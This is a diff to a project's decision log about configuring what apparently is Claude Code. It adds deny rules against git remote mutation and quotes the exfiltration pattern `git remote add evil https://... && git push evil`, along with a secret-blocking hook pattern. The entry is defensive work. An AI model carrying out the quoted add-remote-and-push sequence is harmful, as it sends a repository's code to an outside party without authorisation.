@@ -181,3 +181,12 @@ When a decision is superseded or obsolete, delete it (git history preserves the 
 - Delete `claude-code-review.yml` entirely -- the local code-reviewer agent provides the same review before PR creation, and the CI workflow required managing an `ANTHROPIC_API_KEY` secret in GitHub
 - Keep `dangerous-actions-blocker.sh` `ANTHROPIC_API_KEY=` pattern unchanged -- it blocks secrets in commands generally, not CI-specific
 - Keep `docs/IMPLEMENTATION_PLAN.md` unchanged -- historical record of completed work
+
+## 2026-03-16: Git Remote Mutation Deny Rules
+
+**Request**: Prevent code exfiltration by blocking `git remote add evil https://... && git push evil` attack pattern.
+
+**Decisions**:
+- Deny `git remote add`, `set-url`, `remove`, `rename`, `set-head` in settings.json and all tier files -- read-only `git remote -v` remains allowed via the existing `Bash(git remote *)` allow rule
+- Deny rules are absolute in Claude Code (cannot be overridden by allow), making this the correct control layer vs hooks
+- Tier files use wildcard prefix `Bash(*git remote add *)` to catch chained command variants
